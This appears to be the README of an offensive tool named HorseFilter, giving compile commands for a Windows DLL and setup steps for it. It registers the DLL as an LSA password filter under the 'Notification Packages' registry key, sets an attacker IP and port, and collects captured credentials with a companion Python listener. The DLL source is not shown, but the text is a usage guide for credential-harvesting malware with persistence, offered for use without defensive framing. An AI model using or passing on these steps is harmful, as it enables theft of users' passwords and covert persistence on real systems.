# HorseFilter

/* compile with:

x86_64-w64-mingw32-windres horsefilter.rc -o horsefilter.o <br />
x86_64-w64-mingw32-gcc horsefilter.c horsefilter.o -o horsefilter.dll -shared -lws2_32

*/

// to use: <br />
// change port and ip macros <br />
// add compiled dll anywhere in PATH <br />
// append dll name (no extension) to <br />
//     "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages" <br />
// and restart <br />
// catch creds with horsefilter.py
